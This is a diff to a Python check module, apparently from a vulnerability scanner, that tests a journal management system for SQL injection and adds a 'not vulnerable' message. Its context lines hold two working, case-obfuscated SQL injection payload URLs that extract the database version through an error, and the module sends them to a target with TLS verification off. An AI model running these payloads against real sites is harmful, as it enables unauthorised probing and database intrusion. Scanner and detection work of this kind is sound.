@@ -23,14 +23,18 @@ class newedos_multi_sqli_BaseVerify:
         payloads = ["/select_e.aspx?type=zzdw&content=1%27AnD%20ChAr(ChAr(74)%2BChAr(73)%2B@@VeRsIoN)<0--",
                     "/select_news.aspx?type=1&content=1/**//'/**/AnD/**/ChAr(ChAr(74)%2BChAr(73)%2B@@VeRsIon)/**/>0",]
         try:
+            noexist = True
             for payload in payloads:
                 vulnurl = self.url + payload
                 req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                 if r"JIMicrosoft" in req.text:
                     cprint("[+]存在菲斯特诺期刊系统多处SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")
+                    noexist = False
+            if noexist:
+                cprint("[-]不存在newedos_multi_sqli漏洞", "white", "on_grey")
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
